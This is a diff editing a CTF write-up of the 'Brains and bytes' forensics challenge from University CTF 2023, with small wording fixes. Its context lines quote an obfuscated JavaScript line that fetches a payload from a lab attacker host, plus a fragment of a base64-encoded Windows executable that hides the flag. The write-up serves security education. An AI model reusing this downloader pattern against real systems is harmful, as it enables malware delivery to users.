@@ -11,7 +11,7 @@ categories: [CTF, University CTF 2023 Brains and bytes]
 > Tasked with defending the antidote's research, a diverse group of students united against a relentless cyber onslaught. As codes clashed and defenses were tested, their collective effort stood as humanity's beacon, inching closer to safeguarding the research for the cure with every thwarted attack. A stealthy attack might have penetrated their defenses. Along with the Hackster's University students, analyze the provided file so you can detect this attack in the future. 
 {: .prompt-info }
 
-We are provided with vaccine.js file which is somehow obfuscated so after analysing the file we come across a url `http://infected.human.htb/d/BKtQR`
+We are provided with vaccine.js file which is somehow obfuscated, so after analysing the file we come across a url `http://infected.human.htb/d/BKtQR`
 
 ```javascript
 lOLMCBgGDMolnlotrwOCsILGbKwBtzwvlYFqZdGLMqDxTrcBnpLiTUBqFfekJSDzoSURpLfjiRFSkUbDiScOejegcwcjNbnqGNXuTbtsxWGWvICjWnbUbbSrdUVFqffbkvjTgFhvQddrraBIrYWfNFerCZkSxFapZwPgmIRIyaedLHpBnOvnVBXwzWPxOQJgZModJeUo.open("GET", "http://infected.human.htb/d/BKtQR", false);
@@ -94,11 +94,11 @@ extradata:0         .. text: "<<BASE64_START>>TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEhUQnswbjNfU3QzcF9jbDBzM3JfdDBfdGgzX2N1cjN9Cg==<<BASE64_END>>\n\n"
 ```
 
-This was a very large base64 encoded string. I took the string to cyber chef for a nice "zombie recipe"
+This was a very large base64 string. I took the string to cyber chef for a nice "zombie recipe"
 
 ![img-description](/assets/img/brains-and-bytes/3.png)
 
-We can see `MZ` meaning it is a windows executable file.So i decided to just continue scrolling and boom
+We can see `MZ` meaning it is a windows executable file.So i decided to just continue scrolling and boom there's the cure to the zombie virus.
 
 ![img-description](/assets/img/brains-and-bytes/4.png)
 
